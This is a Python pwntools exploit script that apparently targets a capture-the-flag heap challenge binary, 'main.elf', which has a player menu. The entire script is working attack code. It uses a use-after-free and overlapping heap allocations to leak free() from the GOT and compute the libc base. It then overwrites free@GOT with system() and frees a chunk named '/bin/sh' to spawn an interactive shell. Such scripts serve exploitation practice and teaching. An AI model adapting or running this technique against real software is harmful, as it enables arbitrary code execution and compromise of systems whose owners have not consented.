from pwn import *

p = process('./main.elf')

context(os='linux', arch='amd64')

def Pause():
	log.success("Pausing...")
	raw_input()

def Allocate(name, attack = 1, defense = 2, speed = 3,precision = 4):

	log.success("Allocating Player")
	p.recvuntil("choice: ")
	p.sendline("1")

	p.recvuntil("name: ")
	p.sendline(name)

	p.recvuntil("points: ")
	p.sendline(str(attack))

	p.recvuntil("points: ")
	p.sendline(str(defense))

	p.recvuntil("speed: ")
	p.sendline(str(speed))

	p.recvuntil("precision: ")
	p.sendline(str(precision))

	p.recvuntil("choice:")
	p.sendline('6')


def Free(index):

	log.success("Freeing Player at index: " + str(index))
	p.recvuntil("choice:")
	p.sendline("2")
	p.recvuntil("index:")
	p.sendline(str(index))

def Select(index):
	log.success("Selecting Player at index: " + str(index))
	p.recvuntil("choice:")
	p.sendline("3")
	p.recvuntil("index:")
	p.sendline(str(index))

def TriggerLeak():
	log.success("Triggering Use-After-Free")
	p.recvuntil("choice:")
	p.sendline('5')
	leak = p.recvline().split("Name: ")[1][:6].ljust(8, '\x00')
	log.success("Leaked free(): " + str(leak))
	return u64(leak)

def Execute():

	log.success("Executing /bin/sh free()->system()")
	p.sendline("0")
	p.recvuntil("choice:")
	p.sendline("2")
	p.recvuntil("index:")
	p.sendline("1")

def OverwriteGOT(address):

	log.success("Overwriting GOT")
	p.sendline("4")
	p.recvuntil("choice: ")
	p.sendline("1")
	p.recvuntil("name:")
	p.sendline(address)

def Exploit():

	log.success("Sending Exploit")

	player1 = "A" * 32
	player2 = "B" * 32
	free_addr = 0x603018

	GOTentry = "D" * 16 + p64(free_addr)
	libc_system = 0x45390
	libc_free = 0x844f0

	Allocate(player1) # add_player() 
	Allocate(player2) # add_player()
	Select("1") # select_player()
	Free("1") # delete_player()
	Free("0") # delete_player()
	log.success("Overwriting 'name' Pointer")
	Allocate(GOTentry) # add_player() # Overlap the heap object and overwrite the data structure
	log.success("Pointer 'name' Overwritten")
	leak = TriggerLeak() # show_player()
	libc_base = leak - libc_free
	log.success("libcbase: " + p64(libc_base))
	system = libc_base + libc_system
	log.success("system(): " + p64(system))
	log.success("Allocating Player with name /bin/sh")
	Allocate("/bin/sh") # add_player() 
	OverwriteGOT(p64(system)) # set_name()
	log.success("free@GOT Overwritten with system()")
	Execute() # set_name()
	p.interactive()

Exploit()